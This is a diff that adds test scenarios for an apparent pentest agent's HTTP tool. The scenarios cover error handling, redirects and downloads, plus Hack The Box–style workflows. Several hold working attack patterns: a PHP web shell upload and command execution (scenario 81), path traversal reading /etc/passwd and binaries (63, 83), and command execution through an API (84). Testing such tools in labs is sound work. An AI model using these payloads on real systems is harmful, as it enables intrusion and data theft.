+Args: {url: "http://<IP>/data.gz", output_path: "/session/downloads/data.txt", decompress: true}
+Expected: success=true, decompressed=true, size_bytes reflects decompressed size
+Notes: When URL ends with .gz and decompress=true (default), the file is
+  downloaded to a .gz temp path then decompressed using gzip. The temp .gz
+  is removed after decompression. decompress defaults to true.
+
+## Scenario 62: Download without decompression (keep .gz)
+Method: download_to_file
+Args: {url: "http://<IP>/archive.tar.gz", output_path: "/session/downloads/archive.tar.gz", decompress: false}
+Expected: success=true, file saved as-is without decompression
+Notes: Set decompress=false to keep compressed files. Useful for .tar.gz
+  archives that need tar extraction (not just gunzip). The gzip detection
+  checks URL ending (.gz or .gz? for query strings).
+
+## Scenario 63: Download binary artifact from target (real patterns)
+Method: download_to_file
+Args: {url: "https://<IP>/Home/Download?fileName=../../bin/HadesWeb.dll", output_path: "/session/artifacts/HadesWeb.dll", insecure: true}
+Expected: success=true, size_bytes > 0 (DLL file)
+Notes: Real pattern from Hercules HTB. Path traversal combined with
+  download_to_file for reverse engineering. Also used for database files
+  (logindata.db on Eloquia HTB). The -L flag follows redirects.
+
+## Scenario 64: Download with HTTPS and self-signed cert
+Method: download_to_file
+Args: {url: "https://<IP>/api/export", output_path: "/session/artifacts/export.json", insecure: true, timeout: 120}
+Expected: success=true, file saved
+Notes: insecure flag is required for HTTPS targets with self-signed certs.
+  Without it, download fails with ssl_certificate_error. Same behavior as
+  request method's insecure parameter.
+
+## Scenario 65: Download to nested directory (auto-created)
+Method: download_to_file
+Args: {url: "http://<IP>/config.yml", output_path: "/session/artifacts/configs/target/config.yml"}
+Expected: success=true, parent directories auto-created, file saved
+Notes: The server calls os.makedirs(parent_dir, exist_ok=True) so deeply
+  nested output paths work automatically. No need to pre-create directories.
+
+# ===============================================================================
+# ERROR HANDLING SCENARIOS
+# ===============================================================================
+
+## Scenario 66: Connection refused (port closed)
+Method: request
+Args: {url: "http://<IP>:9999/"}
+Expected: success=false, error.type="connection_refused", error_class="network",
+  retryable=true, suggestions include "Verify the target is up"
+Notes: Tests structured error handling for closed ports. The error_class,
+  retryable, and suggestions fields guide the agent on retry decisions.
+  curl exit code 7 maps to connection_refused.
+
+## Scenario 67: DNS resolution failure
+Method: request
+Args: {url: "http://nonexistent.invalid.htb/"}
+Expected: success=false, error.type="could_not_resolve_host", error_class="network",
+  retryable=true
+Notes: Tests hostname resolution failure. curl exit code 6. retryable=true
+  because DNS may be temporarily unavailable. Suggestions: check hostname
+  spelling, verify DNS resolution.
+
+## Scenario 68: Request timeout
+Method: request
+Args: {url: "http://<IP>/", timeout: 1, connect_timeout: 1}
+Expected: success=false, error.type="timeout", error_class="timeout",
+  retryable=true, suggestions include "Increase timeout value"
+Notes: Tests timeout handling with artificially low timeout. curl exit code 28.
+  The asyncio.TimeoutError path is also covered (timeout + 10s grace period
+  in _execute_curl_request).
+
+## Scenario 69: SSL certificate error without insecure flag
+Method: request
+Args: {url: "https://<IP>/", insecure: false}
+Expected: success=false, error.type="ssl_certificate_error" or "ssl_error",
+  error_class="network", retryable=false, suggestions include "insecure=true"
+Notes: Tests SSL error handling. retryable=false because the cert won't
+  change. curl exit code 60. The suggestion tells the agent to retry with
+  insecure=true.
+
+## Scenario 70: Empty response from server
+Method: request
+Args: {url: "http://<IP>/empty-endpoint"}
+Expected: success depends on server behavior. If curl exit code 52 (empty
+  response), success=false with error.type="empty_response", retryable=true
+Notes: Tests the empty_response error path. Some servers close connections
+  without sending any data. retryable=true because the server may be
+  temporarily overloaded.
+
+## Scenario 71: Too many redirects
+Method: request
+Args: {url: "http://<IP>/redirect-loop", follow_redirects: true}
+Expected: success=false, error.type="too_many_redirects", error_class="config",
+  retryable=false, suggestions include "Set follow_redirects=false"
+Notes: Tests redirect loop detection. Max redirects is 10 (-L --max-redirs 10).
+  curl exit code 47. retryable=false with suggestion to disable redirects and
+  inspect the chain manually.
+
+## Scenario 72: Inject against non-vulnerable endpoint (no command output)
+Method: inject
+Args: {url: "http://<IP>/?cmd={PAYLOAD}", command: "id", encoding: "url"}
+Expected: success=true BUT output is empty or contains only page HTML
+Notes: A successful HTTP request (200) but no command execution. The inject
+  method still returns success=true with the page content. The agent must
+  interpret the extracted_output to determine if RCE actually worked. Empty
+  or HTML-only output means the endpoint is not vulnerable to injection.
+
+## Scenario 73: Upload to non-existent endpoint
+Method: upload
+Args: {url: "http://<IP>/nonexistent-upload.php", file_field: "file", filename: "test.txt", content: "test"}
+Expected: success=true, status_code=404, body contains 404 error
+Notes: Upload returns success=true if the HTTP request completed, even with
+  404/500 status. The agent checks status_code to determine if the upload
+  endpoint exists. This is by design - the upload method uses _execute_curl_request
+  which considers any completed HTTP response as success.
+
+## Scenario 74: Download non-existent file
+Method: download_to_file
+Args: {url: "http://<IP>/nonexistent.zip", output_path: "/session/downloads/test.zip"}
+Expected: May succeed with empty/error file (curl follows redirects to error page)
+  OR fail if server returns non-200 after redirect
+Notes: curl -L may follow error redirect to a custom 404 page and save THAT
+  content to disk. The file_size will be > 0 but contains HTML error page.
+  Agent should verify downloaded content. The download method checks
+  proc.returncode != 0 for failures.
+
+## Scenario 75: Connection failure during download_to_file
+Method: download_to_file
+Args: {url: "http://<IP>:9999/large.bin", output_path: "/session/downloads/test.bin"}
+Expected: success=false, error class and retryable populated
+Notes: Tests download_to_file error handling path. Similar to request errors
+  but with additional file cleanup. If the download partially completed, the
+  partial file may exist on disk.
+
+## Scenario 76: Decompression failure (invalid gzip)
+Method: download_to_file
+Args: {url: "http://<IP>/fake.gz", output_path: "/session/downloads/fake.txt", decompress: true}
+Expected: success=false, error contains "Decompression failed",
+  error_class="config"
+Notes: Tests the gzip decompression error path. If the .gz file is not valid
+  gzip (e.g., renamed HTML file), the gzip.open fails and returns a
+  descriptive error. The temp .gz file is left on disk in this case.
+
+# ===============================================================================
+# REDIRECT HANDLING SCENARIOS
+# ===============================================================================
+
+## Scenario 77: Follow redirect chain and parse final response
+Method: request
+Args: {url: "http://<IP>/", follow_redirects: true}
+Expected: success=true, status_code from FINAL response (not 301/302),
+  headers from final response, body from final response
+Notes: The response parser handles redirect chains by finding the LAST HTTP
+  status line in the output. For a chain like 301->302->200, only the 200
+  response headers and body are returned. Intermediate responses are discarded.
+  This is the default behavior (follow_redirects=true).
+
+## Scenario 78: Inspect redirect without following
+Method: request
+Args: {url: "http://<IP>/login", method: "POST", data: "user=admin&pass=test", headers: {"Content-Type": "application/x-www-form-urlencoded"}, follow_redirects: false}
+Expected: success=true, status_code=301/302/303, headers.location contains
+  redirect target, possible Set-Cookie headers
+Notes: After login POST, servers redirect to dashboard. The Set-Cookie on
+  the redirect response is the session cookie. With follow_redirects=false,
+  you capture this cookie for use in subsequent requests.
+
+## Scenario 79: HTTP to HTTPS redirect
+Method: request
+Args: {url: "http://<IP>/", follow_redirects: false}
+Expected: success=true, status_code=301, headers.location starts with "https://"
+Notes: Many servers redirect HTTP to HTTPS. Without follow_redirects=false,
+  this is transparent. With it, you see the redirect and can decide whether
+  to follow with insecure=true for self-signed certs.
+
+# ===============================================================================
+# COMBINED WORKFLOW SCENARIOS
+# ===============================================================================
+
+## Scenario 80: Login flow - capture session, then authenticated request
+# Step 1: Login
+Method: request
+Args: {url: "http://<IP>/login", method: "POST", data: "username=admin&password=admin", headers: {"Content-Type": "application/x-www-form-urlencoded"}, follow_redirects: false}
+Expected: status_code=302, headers contain set-cookie with session ID
+# Step 2: Use session
+Method: request
+Args: {url: "http://<IP>/admin/dashboard", cookie: "<session from step 1>"}
+Expected: success=true, status_code=200, body contains admin content
+Notes: Two-step workflow that exercises cookie capture and reuse. This is
+  the fundamental pattern for authenticated testing.
+
+## Scenario 81: Upload then verify web shell
+# Step 1: Upload shell
+Method: upload
+Args: {url: "http://<IP>/upload.php", file_field: "file", filename: "shell.php", content: "<?php system($_GET['c']); ?>", content_type: "application/x-php", cookie: "<session>"}
+Expected: success=true
+# Step 2: Verify shell exists
+Method: request
+Args: {url: "http://<IP>/uploads/shell.php?c=id", method: "HEAD"}
+Expected: status_code=200
+# Step 3: Execute via inject
+Method: inject
+Args: {url: "http://<IP>/uploads/shell.php?c={PAYLOAD}", command: "id", encoding: "url"}
+Expected: success=true, output contains "uid="
+Notes: Full web shell lifecycle. Upload -> verify existence with HEAD ->
+  execute commands via inject. The inject method handles output extraction
+  automatically.
+
+## Scenario 82: Download artifact, then fingerprint
+# Step 1: Check for interesting file
+Method: request
+Args: {url: "http://<IP>/.git/HEAD"}
+Expected: status_code=200, body contains "ref: refs/heads/"
+# Step 2: Download git objects
+Method: download_to_file
+Args: {url: "http://<IP>/.git/config", output_path: "/session/artifacts/git-config"}
+Expected: success=true, file contains git configuration
+Notes: Git repository exposure detection and extraction. Step 1 checks for
+  existence, step 2 downloads for analysis. Same pattern applies to .env,
+  backup.sql, wp-config.php, etc.
+
+## Scenario 83: Path traversal enumeration
+# Step 1: Test traversal
+Method: request
+Args: {url: "http://<IP>/download?file=../../etc/passwd", insecure: true}
+Expected: success=true, body contains "root:x:0:0:"
+# Step 2: Download binary via traversal
+Method: download_to_file
+Args: {url: "http://<IP>/download?file=../../bin/target.dll", output_path: "/session/artifacts/target.dll", insecure: true}
+Expected: success=true, binary file saved
+Notes: Real pattern from Hercules HTB. Path traversal with request to test,
+  then download_to_file for binary extraction. raw_response can also be used
+  in step 1 for small binary files.
+
+## Scenario 84: API exploitation workflow - enumerate, auth, exploit
+# Step 1: Discover API spec
+Method: download_to_file
+Args: {url: "http://<IP>/api/openapi.json", output_path: "/session/artifacts/openapi.json"}
+Expected: success=true, OpenAPI spec downloaded
+# Step 2: Authenticate
+Method: request
+Args: {url: "http://<IP>/api/token-auth", method: "POST", data: "{\"username\": \"admin\", \"password\": \"found_password\"}", headers: {"Content-Type": "application/json"}}
+Expected: success=true, body contains token/JWT
+# Step 3: Exploit authenticated endpoint
+Method: request
+Args: {url: "http://<IP>/api/v2/middleware", method: "PUT", data: "{\"binary\": \"/bin/bash\", \"script\": \"#!/bin/bash\\nid\"}", headers: {"Content-Type": "application/json", "Authorization": "Bearer <token>"}}
+Expected: success=true, command executed via API
+Notes: Full API exploitation workflow from DevArea HTB. Download spec for
+  endpoint discovery, authenticate for JWT, use token for privileged API calls.
+
+## Scenario 85: Virtual host discovery and exploitation
+# Step 1: Default vhost
+Method: request
+Args: {url: "http://<IP>/"}
+Expected: success=true, default page
+# Step 2: Named vhost
+Method: request
+Args: {url: "http://<IP>/", headers: {"Host": "admin.target.htb"}}
+Expected: success=true, different content from step 1
+# Step 3: Exploit vhost-specific endpoint
+Method: request
+Args: {url: "http://<IP>/api/deploy", method: "POST", headers: {"Host": "deploy.target.htb", "Content-Type": "application/json"}, data: "{\"target\": \"exploit\"}"}
+Expected: success=true, vhost-specific functionality accessed
+Notes: Virtual host discovery was extremely common (137 Host headers). Many
+  HTB boxes serve different applications on different vhosts at the same IP.
+  The Host header is the only way to reach them without DNS.
